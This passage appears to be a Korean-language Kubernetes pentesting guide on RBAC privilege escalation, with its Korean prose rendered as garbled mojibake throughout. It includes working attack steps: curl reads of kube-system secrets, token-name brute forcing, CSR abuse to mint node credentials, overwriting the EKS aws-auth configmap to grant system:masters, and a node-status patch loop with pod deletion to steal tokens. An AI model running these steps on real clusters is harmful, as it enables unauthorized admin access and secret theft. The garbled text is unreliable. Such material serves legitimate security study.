**ë¹„ë°€ ëª©ë¡ ê¶Œí•œì€ ê³µê²©ìê°€ REST API ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ ë¹„ë°€ì„ ì‹¤ì œë¡œ ì½ì„ ìˆ˜ ìˆê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ì‹œí¬ë¦¿ ì½ê¸° - í† í° ID ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©

ì½ê¸° ê¶Œí•œì„ ê°€ì§„ í† í°ì„ ì†Œìœ í•œ ê³µê²©ìëŠ” ì‹œí¬ë¦¿ì˜ ì •í™•í•œ ì´ë¦„ì„ ì‚¬ìš©í•´ì•¼ë§Œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì§€ë§Œ, ë” ë„“ì€ ë²”ìœ„ì˜ "ì‹œí¬ë¦¿ ëª©ë¡" ê¶Œí•œê³¼ëŠ” ë‹¬ë¦¬ ì—¬ì „íˆ ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì‹œìŠ¤í…œì˜ ê¸°ë³¸ ì„œë¹„ìŠ¤ ê³„ì •ì€ ì—´ê±°ë  ìˆ˜ ìˆìœ¼ë©°, ê°ê°ì€ ì‹œí¬ë¦¿ê³¼ ì—°ê²°ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì‹œí¬ë¦¿ì€ ì •ì  ì ‘ë‘ì‚¬ì™€ ëœë¤í•œ ë‹¤ì„¯ ê¸€ìì˜ ì•ŒíŒŒë²³ê³¼ ìˆ«ìë¡œ ì´ë£¨ì–´ì§„ í† í°ì˜ ì´ë¦„ êµ¬ì¡°ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. (íŠ¹ì • ë¬¸ìë¥¼ ì œì™¸í•œ) [ì†ŒìŠ¤ ì½”ë“œ](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)ì— ë”°ë¥´ë©´, ì´ í† í°ì€ ì œí•œëœ 27ìë¡œ êµ¬ì„±ëœ ë¬¸ì ì§‘í•©(`bcdfghjklmnpqrstvwxz2456789`)ì—ì„œ ìƒì„±ë©ë‹ˆë‹¤.

ì´ ì œí•œìœ¼ë¡œ ì¸í•´ ê°€ëŠ¥í•œ ì¡°í•©ì˜ ì´ ìˆ˜ëŠ” 14,348,907(27^5)ë¡œ ì¤„ì–´ë“­ë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” ëª‡ ì‹œê°„ ì•ˆì— í† í°ì„ ì¶”ì¸¡í•˜ê¸° ìœ„í•´ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¡œ ì¸í•´ ë¯¼ê°í•œ ì„œë¹„ìŠ¤ ê³„ì •ì— ì ‘ê·¼í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### ì¸ì¦ì„œ ì„œëª… ìš”ì²­

`certificatesigningrequests` ë¦¬ì†ŒìŠ¤ì—ì„œ **`create`** ë™ì‚¬ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´(ë˜ëŠ” ì ì–´ë„ `certificatesigningrequests/nodeClient`ì— ê°€ì§€ê³  ìˆë‹¤ë©´), **ìƒˆë¡œìš´ ë…¸ë“œì˜** CeSRì„ **ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[ë¬¸ì„œ](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)ì— ë”°ë¥´ë©´ ì´ ìš”ì²­ì„ ìë™ìœ¼ë¡œ ìŠ¹ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì¶”ê°€ ê¶Œí•œì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šì€ ê²½ìš°, ìš”ì²­ì„ ìŠ¹ì¸í•  ìˆ˜ ìˆì–´ì•¼ í•˜ë©°, ì´ëŠ” `certificatesigningrequests/approval`ì—ì„œì˜ ì—…ë°ì´íŠ¸ì™€ `signers`ì—ì„œì˜ `approve`ë¥¼ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ë•Œ ë¦¬ì†ŒìŠ¤ ì´ë¦„ì€ `<signerNameDomain>/<signerNamePath>` ë˜ëŠ” `<signerNameDomain>/*` í˜•ì‹ì´ì–´ì•¼ í•©ë‹ˆë‹¤.

í•„ìš”í•œ ëª¨ë“  ê¶Œí•œì„ ê°€ì§„ **ë¡¤ì˜ ì˜ˆì‹œ**ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
ê·¸ë˜ì„œ, ìƒˆë¡œìš´ ë…¸ë“œ CSRì´ ìŠ¹ì¸ë˜ë©´, ë…¸ë“œì˜ íŠ¹ë³„í•œ ê¶Œí•œì„ **ë‚¨ìš©í•˜ì—¬** ë¹„ë°€ì„ **í›”ì¹˜ê³ ** ê¶Œí•œì„ **ìŠ¹ê²©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ì´ ê²Œì‹œë¬¼**](https://www.4armed.com/blog/hacking-kubelet-on-gke/)ê³¼ [**ì´ ê²Œì‹œë¬¼**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)ì—ì„œ GKE K8s TLS ë¶€íŠ¸ìŠ¤íŠ¸ë© êµ¬ì„±ì´ **ìë™ ì„œëª…**ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©°, ì´ë¥¼ ë‚¨ìš©í•˜ì—¬ ìƒˆë¡œìš´ K8s ë…¸ë“œì˜ ìê²©ì¦ëª…ì„ ìƒì„±í•œ ë‹¤ìŒ ë¹„ë°€ì„ í›”ì³ ê¶Œí•œì„ ìŠ¹ê²©í•©ë‹ˆë‹¤.\
ë§Œì•½ **ì–¸ê¸‰í•œ ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´ ë™ì¼í•œ ì‘ì—…ì„ ìˆ˜í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì²« ë²ˆì§¸ ì˜ˆì œëŠ” ìƒˆë¡œìš´ ë…¸ë“œê°€ ìì‹ ì—ê²Œ ë§ˆìš´íŠ¸ëœ ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì˜ ë¹„ë°€ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ê²ƒì„ ë°©ì§€í•˜ëŠ” ì˜¤ë¥˜ë¥¼ ìš°íšŒí•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ **ë…¸ë“œëŠ” ìì‹ ì—ê²Œ ë§ˆìš´íŠ¸ëœ ì»¨í…Œì´ë„ˆì˜ ë¹„ë°€ì—ë§Œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.**

ì´ë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì€ ê·¸ëƒ¥ **í¥ë¯¸ë¡œìš´ ë¹„ë°€ì´ ë§ˆìš´íŠ¸ëœ ì»¨í…Œì´ë„ˆì˜ ë…¸ë“œ ì´ë¦„ì— ëŒ€í•œ ë…¸ë“œ ìê²©ì¦ëª…ì„ ìƒì„±**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. (í•˜ì§€ë§Œ ì´ë¥¼ ì–´ë–»ê²Œ ìˆ˜í–‰í•˜ëŠ”ì§€ëŠ” ì²« ë²ˆì§¸ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS (AWSì—ì„œ í•„ìš”) í´ëŸ¬ìŠ¤í„°ì˜ kube-system ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ **`configmaps`**ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” **aws-auth** configmapì„ ë®ì–´ì“°ë©´ í´ëŸ¬ìŠ¤í„° ê´€ë¦¬ì ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í•„ìš”í•œ ë™ì‚¬ëŠ” **`update`**ì™€ **`patch`**ì´ë©°, configmapì´ ìƒì„±ë˜ì§€ ì•Šì•˜ë‹¤ë©´ **`create`**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**ë‹¤ë¥¸ ê³„ì •**ì—ì„œ ì‚¬ìš©ìì—ê²Œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ê¸° ìœ„í•´ **`aws-auth`**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ `aws --profile other_account eks update-kubeconfig --name <cluster-name>`ì€ **ë‹¤ë¥¸ ê³„ì •ì—ì„œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ ì‹¤ì œë¡œ `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`ì€ ì´ë¦„ë§Œ ì‚¬ìš©í•˜ëŠ” ëŒ€ì‹  í´ëŸ¬ìŠ¤í„°ì˜ ARNì„ ë„£ìœ¼ë©´ ì‘ë™í•©ë‹ˆë‹¤.\
`kubectl`ì„ ì‘ë™ì‹œí‚¤ë ¤ë©´ **í”¼í•´ìì˜ kubeconfigë¥¼ êµ¬ì„±**í•˜ê³  aws exec argsì— `--profile other_account_role`ì„ ì¶”ê°€í•˜ë©´ kubectlì´ í† í°ì„ ê°€ì ¸ì˜¤ê³  AWSì— ì—°ë½í•˜ê¸° ìœ„í•´ ë‹¤ë¥¸ ê³„ì • í”„ë¡œí•„ì„ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### GKEì—ì„œ ê¶Œí•œ ìƒìŠ¹í•˜ê¸°

GCP ì£¼ì²´ì—ê²Œ K8s ê¶Œí•œì„ í• ë‹¹í•˜ëŠ” **ë‘ ê°€ì§€ ë°©ë²•**ì´ ìˆìŠµë‹ˆë‹¤. ì–´ë–¤ ê²½ìš°ì—ë„ ì£¼ì²´ëŠ” í´ëŸ¬ìŠ¤í„°ì— ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•œ ìê²© ì¦ëª…ì„ ìˆ˜ì§‘í•  ìˆ˜ ìˆë„ë¡ **`container.clusters.get`** ê¶Œí•œë„ í•„ìš”í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ **ìì²´ kubectl êµ¬ì„± íŒŒì¼**ì„ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤(ë‹¤ìŒ ë§í¬ë¥¼ ë”°ë¥´ì„¸ìš”).

{% hint style="warning" %}
K8s API ì—”ë“œí¬ì¸íŠ¸ì™€ í†µì‹ í•  ë•Œ **GCP ì¸ì¦ í† í°ì´ ì „ì†¡**ë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ GCPëŠ” K8s API ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ ë¨¼ì € ì£¼ì²´(ì´ë©”ì¼ë¡œ)ê°€ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ **ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸**í•œ ë‹¤ìŒ GCP IAMì„ í†µí•´ **ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸**í•©ë‹ˆë‹¤.\
ì´ ì¤‘ **ì–´ëŠ í•˜ë‚˜ë¼ë„** ì°¸ì´ë©´ ì‘ë‹µì´ ì „ë‹¬ë©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ GCP IAMì„ í†µí•´ ê¶Œí•œì„ ë¶€ì—¬í•˜ë¼ëŠ” **ì˜¤ë¥˜ ë©”ì‹œì§€**ê°€ í‘œì‹œë©ë‹ˆë‹¤.
{% endhint %}

ì²« ë²ˆì§¸ ë°©ë²•ì€ **GCP IAM**ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. K8s ê¶Œí•œì—ëŠ” **í•´ë‹¹í•˜ëŠ” GCP IAM ê¶Œí•œ**ì´ ìˆìœ¼ë©°, ì£¼ì²´ê°€ í•´ë‹¹ ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

ë‘ ë²ˆì§¸ ë°©ë²•ì€ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ì‚¬ìš©ìë¥¼ ì‹ë³„í•˜ê¸° ìœ„í•´ **ì´ë©”ì¼**ì„ ì‚¬ìš©í•˜ì—¬ K8s ê¶Œí•œì„ í• ë‹¹í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤(GCP ì„œë¹„ìŠ¤ ê³„ì • í¬í•¨).

### serviceaccounts í† í° ìƒì„±

**TokenRequests**(`serviceaccounts/token`)ë¥¼ **ìƒì„±í•  ìˆ˜ ìˆëŠ” ì£¼ì²´**ì…ë‹ˆë‹¤. K8s API ì—”ë“œí¬ì¸íŠ¸ì™€ í†µì‹ í•  ë•Œ SAsì— ëŒ€í•œ ì •ë³´ì…ë‹ˆë‹¤([**ì—¬ê¸°**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)ì—ì„œ í™•ì¸).

### ephemeralcontainers

**`pods/ephemeralcontainers`**ë¥¼ **`update`** ë˜ëŠ” **`patch`**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” ë‹¤ë¥¸ íŒŸì—ì„œ **ì½”ë“œ ì‹¤í–‰**ì„ í•  ìˆ˜ ìˆìœ¼ë©°, íŠ¹ê¶Œì´ ìˆëŠ” securityContextë¥¼ ê°€ì§„ ì„ì‹œ ì»¨í…Œì´ë„ˆë¥¼ ì¶”ê°€í•¨ìœ¼ë¡œì¨ ë…¸ë“œì—ì„œ **íƒˆì¶œ**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

### ValidatingWebhookConfigurations ë˜ëŠ” MutatingWebhookConfigurations

`validatingwebhookconfigurations` ë˜ëŠ” `mutatingwebhookconfigurations`ì— ëŒ€í•´ `create`, `update`, `patch` ì¤‘ í•˜ë‚˜ì˜ ë™ì‚¬ë¥¼ ê°€ì§„ ì£¼ì²´ëŠ” **ê¶Œí•œ ìƒìŠ¹**ì„ ìœ„í•´ í•´ë‹¹ webhookconfigurations ì¤‘ í•˜ë‚˜ë¥¼ **ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[`mutatingwebhookconfigurations` ì˜ˆì œëŠ” ì´ í¬ìŠ¤íŠ¸ì˜ ì´ ì„¹ì…˜ì„ í™•ì¸í•˜ì„¸ìš”](./#malicious-admission-controller).

### ê¶Œí•œ ìƒìŠ¹

ë‹¤ìŒ ì„¹ì…˜ì¸ [**ë‚´ì¥ëœ íŠ¹ê¶Œ ìƒìŠ¹ ë°©ì§€**](./#built-in-privileged-escalation-prevention)ì—ì„œ ì½ì„ ìˆ˜ ìˆë“¯ì´, ì£¼ì²´ëŠ” ìƒˆë¡œìš´ ê¶Œí•œì„ ê°€ì§„ ì—­í• ì´ë‚˜ í´ëŸ¬ìŠ¤í„° ì—­í• ì„ ì—…ë°ì´íŠ¸í•˜ê±°ë‚˜ ìƒì„±í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. **`roles`** ë˜ëŠ” **`clusterroles`**ì— ëŒ€í•œ **`escalate`** ë™ì‚¬ë¥¼ ê°€ì§€ê³  ìˆì§€ ì•ŠëŠ” í•œ.\
ê·¸ëŸ° ë‹¤ìŒ ê·¸ëŠ” ìì‹ ì´ ê°€ì§„ ê¶Œí•œë³´ë‹¤ ë” ë‚˜ì€ ê¶Œí•œì„ ê°€ì§„ ìƒˆë¡œìš´ ì—­í• , í´ëŸ¬ìŠ¤í„° ì—­í• ì„ ì—…ë°ì´íŠ¸/ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë…¸ë“œ í”„ë¡ì‹œ

**`nodes/proxy`** í•˜ìœ„ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” Kubelet APIë¥¼ í†µí•´ íŒŸì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤([**ì—¬ê¸°**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego) ì°¸ì¡°). ì´ í˜ì´ì§€ì—ì„œ Kubelet ì¸ì¦ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

[**ì—¬ê¸°ì—ì„œ Kubelet APIì— ê¶Œí•œì„ ê°€ì§„ ìƒíƒœë¡œ RCEë¥¼ ì–»ëŠ” ì˜ˆì œ**](../pentesting-kubernetes-services.md#kubelet-rce)ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### íŒŸ ì‚­ì œ + ì˜ˆì•½ë˜ì§€ ì•Šì€ ë…¸ë“œ

**íŒŸì„ ì‚­ì œ**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´(`pods` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `delete` ë™ì‚¬), **íŒŸì„ ë¹„ìš°ê¸°**(`pods/eviction` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `create` ë™ì‚¬), **íŒŸ ìƒíƒœ ë³€ê²½**(access to `pods/status`), **ë‹¤ë¥¸ ë…¸ë“œ ì˜ˆì•½ ë¶ˆê°€ëŠ¥**(`nodes/status`ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤) ë˜ëŠ” **ë…¸ë“œ ì‚­ì œ**(`nodes` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `delete` ë™ì‚¬) ê¶Œí•œì´ ìˆëŠ” ì£¼ì²´ëŠ” íŒŸì„ í†µì œí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ íŒŸì„ ë‹¤ë¥¸ ë…¸ë“œë¡œ **ì´ë™**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ê³µê²©ìëŠ” **íƒˆì·¨**í•œ íŒŸì—ì„œ í† í°ì„ **í›”ì¹ ** ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### ì„œë¹„ìŠ¤ ìƒíƒœ (CVE-2020-8554)

**`services/status`**ë¥¼ **ìˆ˜ì •**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” **`status.loadBalancer.ingress.ip`** í•„ë“œë¥¼ ì„¤ì •í•˜ì—¬ **ìˆ˜ì •ë˜ì§€ ì•Šì€ CVE-2020-8554**ë¥¼ ì•…ìš©í•˜ê³  í´ëŸ¬ìŠ¤í„°ì— ëŒ€í•œ **MiTM ê³µê²©ì„ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. CVE-2020-8554ì— ëŒ€í•œ ëŒ€ë¶€ë¶„ì˜ ì™„í™” ì¡°ì¹˜ëŠ” ExternalIP ì„œë¹„ìŠ¤ë§Œ ë°©ì§€í•©ë‹ˆë‹¤ ([**ì—¬ê¸°**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego) ì°¸ì¡°).

### ë…¸ë“œ ë° íŒŒë“œ ìƒíƒœ

**`nodes/status`** ë˜ëŠ” **`pods/status`**ì— ëŒ€í•œ **`update`** ë˜ëŠ” **`patch`** ê¶Œí•œì„ ê°€ì§„ ì£¼ì²´ëŠ” ë ˆì´ë¸”ì„ ìˆ˜ì •í•˜ì—¬ ê°•ì œë¡œ ìŠ¤ì¼€ì¤„ë§ ì œì•½ ì¡°ê±´ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë‚´ì¥ëœ ê¶Œí•œ ìƒìŠ¹ ë°©ì§€

Kubernetesì—ëŠ” [ë‚´ì¥ëœ ë©”ì»¤ë‹ˆì¦˜](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)ì´ ìˆì–´ ê¶Œí•œ ìƒìŠ¹ì„ ë°©ì§€í•©ë‹ˆë‹¤.

ì´ ì‹œìŠ¤í…œì€ **ì‚¬ìš©ìê°€ ì—­í• ì´ë‚˜ ì—­í•  ë°”ì¸ë”©ì„ ìˆ˜ì •í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ì—†ë„ë¡ ë³´ì¥**í•©ë‹ˆë‹¤. ì´ ê·œì¹™ì˜ ê°•ì œ ì‹¤í–‰ì€ API ìˆ˜ì¤€ì—ì„œ ì´ë£¨ì–´ì§€ë©°, RBAC ì¸ì¦ìê°€ ë¹„í™œì„±í™”ë˜ì—ˆì„ ë•Œì—ë„ ì•ˆì „ì¥ì¹˜ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

ì´ ê·œì¹™ì€ **ì‚¬ìš©ìê°€ ì—­í• ì„ ìƒì„±í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ê°€ì§€ë ¤ë©´ í•´ë‹¹ ì—­í• ì´ í¬í•¨í•˜ëŠ” ëª¨ë“  ê¶Œí•œì„ ì†Œìœ **í•´ì•¼ í•œë‹¤ê³  ê·œì •í•©ë‹ˆë‹¤. ë˜í•œ ì‚¬ìš©ìì˜ ê¸°ì¡´ ê¶Œí•œ ë²”ìœ„ëŠ” ì—­í• ì„ ìƒì„±í•˜ê±°ë‚˜ ìˆ˜ì •í•˜ë ¤ëŠ” ì—­í• ê³¼ ì¼ì¹˜í•´ì•¼ í•©ë‹ˆë‹¤. ClusterRolesì˜ ê²½ìš° í´ëŸ¬ìŠ¤í„° ì „ì²´ì´ë©°, Rolesì˜ ê²½ìš° ë™ì¼í•œ ë„¤ì„ìŠ¤í˜ì´ìŠ¤(ë˜ëŠ” í´ëŸ¬ìŠ¤í„° ì „ì²´)ë¡œ ì œí•œë©ë‹ˆë‹¤.

{% hint style="warning" %}
ì´ì „ ê·œì¹™ì—ëŠ” ì˜ˆì™¸ê°€ ìˆìŠµë‹ˆë‹¤. ì£¼ì²´ê°€ **`roles`** ë˜ëŠ” **`clusterroles`**ì— ëŒ€í•œ **`escalate`** ë™ì‚¬ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´ ê¶Œí•œì´ ì—†ì–´ë„ ì—­í• ê³¼ í´ëŸ¬ìŠ¤í„° ì—­í• ì˜ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### **RoleBindings/ClusterRoleBindings ê°€ì ¸ì˜¤ê¸° ë° íŒ¨ì¹˜**

{% hint style="danger" %}
**ì´ ê¸°ìˆ ì€ ì´ì „ì— ì‘ë™í–ˆì§€ë§Œ, ì œ í…ŒìŠ¤íŠ¸ì— ë”°ë¥´ë©´ ì´ì „ ì„¹ì…˜ì—ì„œ ì„¤ëª…í•œ ì´ìœ ë¡œ ë” ì´ìƒ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ë¯¸ ê¶Œí•œì´ ì—†ëŠ” ê²½ìš° ìì‹ ì´ë‚˜ ë‹¤ë¥¸ SAì— ê¶Œí•œì„ ë¶€ì—¬í•˜ê¸° ìœ„í•´ rolebindingì„ ìƒì„±/ìˆ˜ì •í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.**
{% endhint %}

Rolebindingsë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì€ ì‚¬ìš©ìê°€ **ì„œë¹„ìŠ¤ ê³„ì •ì— ì—­í• ì„ ë°”ì¸ë”©**í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì´ ê¶Œí•œì€ **ì‚¬ìš©ìê°€ ì†ìƒëœ ì„œë¹„ìŠ¤ ê³„ì •ì— ê´€ë¦¬ì ê¶Œí•œì„ ë°”ì¸ë”©**í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ê¶Œí•œ ìƒìŠ¹ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ê¸°íƒ€ ê³µê²©

### ì‚¬ì´ë“œì¹´ í”„ë¡ì‹œ ì•±

ê¸°ë³¸ì ìœ¼ë¡œ íŒŒë“œ ê°„ í†µì‹ ì—ëŠ” ì•”í˜¸í™”ê°€ ì—†ìŠµë‹ˆë‹¤. ìƒí˜¸ ì¸ì¦, ì–‘ë°©í–¥, íŒŒë“œ ê°„.

#### ì‚¬ì´ë“œì¹´ í”„ë¡ì‹œ ì•± ìƒì„± <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

.yaml íŒŒì¼ì„ ìƒì„±í•˜ì„¸ìš”.
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
ë‹¹ì‹ ì˜ .yaml íŒŒì¼ì„ í¸ì§‘í•˜ê³  ì£¼ì„ ì²˜ë¦¬ëœ ë¼ì¸ì„ ì¶”ê°€í•˜ì„¸ìš”.
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
í”„ë¡ì‹œì˜ ë¡œê·¸ë¥¼ í™•ì¸í•˜ì„¸ìš”:
```bash
kubectl logs app -C proxy
```
ë” ë§ì€ ì •ë³´ëŠ” ë‹¤ìŒ ë§í¬ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### ì•…ì„± Admission Controller

